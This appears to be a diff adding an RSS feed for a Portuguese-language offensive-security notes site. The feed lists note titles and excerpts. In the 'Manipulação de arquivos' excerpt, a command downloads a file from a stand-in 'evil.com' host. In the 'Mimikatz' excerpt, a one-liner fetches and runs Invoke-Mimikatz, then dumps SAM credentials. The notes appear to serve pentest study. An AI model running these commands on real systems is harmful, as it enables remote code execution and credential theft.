@@ -1,0 +1,70 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<rss version="2.0">
+    <channel>
+      <title>🐐 0x6a70</title>
+      <link>https://0x6a70.com</link>
+      <description>Últimas 10 notas on 🐐 0x6a70</description>
+      <generator>Quartz -- quartz.jzhao.xyz</generator>
+      <item>
+    <title>PHP Sessions</title>
+    <link>https://0x6a70.com/Linguagens/PHP/PHP-Sessions</link>
+    <guid>https://0x6a70.com/Linguagens/PHP/PHP-Sessions</guid>
+    <description>...</description>
+    <pubDate>Tue, 28 Jan 2025 07:36:06 GMT</pubDate>
+  </item><item>
+    <title>PHP Wrappers</title>
+    <link>https://0x6a70.com/Linguagens/PHP/PHP-Wrappers</link>
+    <guid>https://0x6a70.com/Linguagens/PHP/PHP-Wrappers</guid>
+    <description>...</description>
+    <pubDate>Tue, 28 Jan 2025 07:36:06 GMT</pubDate>
+  </item><item>
+    <title>DPAPI</title>
+    <link>https://0x6a70.com/OS-Hacking/Windows/API/DPAPI</link>
+    <guid>https://0x6a70.com/OS-Hacking/Windows/API/DPAPI</guid>
+    <description> DataProtectionAPI.</description>
+    <pubDate>Tue, 28 Jan 2025 07:36:06 GMT</pubDate>
+  </item><item>
+    <title>Cobrindo rastros</title>
+    <link>https://0x6a70.com/OS-Hacking/Windows/Cobrindo-rastros</link>
+    <guid>https://0x6a70.com/OS-Hacking/Windows/Cobrindo-rastros</guid>
+    <description>...</description>
+    <pubDate>Tue, 28 Jan 2025 07:36:06 GMT</pubDate>
+  </item><item>
+    <title>Coletando informações</title>
+    <link>https://0x6a70.com/OS-Hacking/Windows/Coletando-informa%C3%A7%C3%B5es</link>
+    <guid>https://0x6a70.com/OS-Hacking/Windows/Coletando-informa%C3%A7%C3%B5es</guid>
+    <description> As vezes, é necessário visualizar todas as abas que estão abertas no computador. Assim, pode-se utilizar: get-process | where-object {$_.mainwindowtitle -ne &quot;&quot;} | Select-Object mainwindowtitle Para manter o log de informações pode ser importante, para isso Start-Transcript -Path C:\transcript.txt .</description>
+    <pubDate>Tue, 28 Jan 2025 07:36:06 GMT</pubDate>
+  </item><item>
+    <title>Manipulação de arquivos</title>
+    <link>https://0x6a70.com/OS-Hacking/Windows/Manipula%C3%A7%C3%A3o-de-arquivos</link>
+    <guid>https://0x6a70.com/OS-Hacking/Windows/Manipula%C3%A7%C3%A3o-de-arquivos</guid>
+    <description> As vezes, é necessário obter informações do conteúdo de um arquivo. Assim, usa-se $content = Get-Content $file; $content Ou então, pode-se dizer cat $file Infiltração de arquivos Para obter o conteúdo de um arquivo da internet e armazená-lo em um path, pode-se utilizar: Invoke-WebRequest -URI &quot;www.evil.com/path/to/file&quot; -OutFile &quot;C:/path/to/output&quot;.</description>
+    <pubDate>Tue, 28 Jan 2025 07:36:06 GMT</pubDate>
+  </item><item>
+    <title>Mimikatz</title>
+    <link>https://0x6a70.com/OS-Hacking/Windows/Mimikatz</link>
+    <guid>https://0x6a70.com/OS-Hacking/Windows/Mimikatz</guid>
+    <description>Mimikatz é uma ferramenta poderosa para pentest em sistemas Windows. Primeiramente importamos com: iex (New-Object Net.WebClient).DownloadString(&quot;raw.githubusercontent.com/dievus/PowerShellForPentesters/main/Tools/Invoke-Mimikatz.ps1&quot;) E conseguimos chamá-lo com: Invoke-Mimikatz -Command lsadump::sam Coletando senhas ao modificar os registros Dar uma olhada aqui → www.ired.team/offensive-security/credential-access-and-credential-dumping/forcing-wdigest-to-store-credentials-in-plaintext.</description>
+    <pubDate>Tue, 28 Jan 2025 07:36:06 GMT</pubDate>
+  </item><item>
+    <title>CVE</title>
+    <link>https://0x6a70.com/Outros/CVE</link>
+    <guid>https://0x6a70.com/Outros/CVE</guid>
+    <description> O que é CVE? CVE (sigla para Commom Vulnerabilities and Exposures) é uma lista de registros de ameaças e vulnerabilidades identificadas em softwares.</description>
+    <pubDate>Tue, 28 Jan 2025 07:36:06 GMT</pubDate>
+  </item><item>
+    <title>Linux</title>
+    <link>https://0x6a70.com/Outros/Linux</link>
+    <guid>https://0x6a70.com/Outros/Linux</guid>
+    <description>...</description>
+    <pubDate>Tue, 28 Jan 2025 07:36:06 GMT</pubDate>
+  </item><item>
+    <title>NIST</title>
+    <link>https://0x6a70.com/Outros/NIST</link>
+    <guid>https://0x6a70.com/Outros/NIST</guid>
+    <description>...</description>
+    <pubDate>Tue, 28 Jan 2025 07:36:06 GMT</pubDate>
+  </item>
+    </channel>
+  </rss>
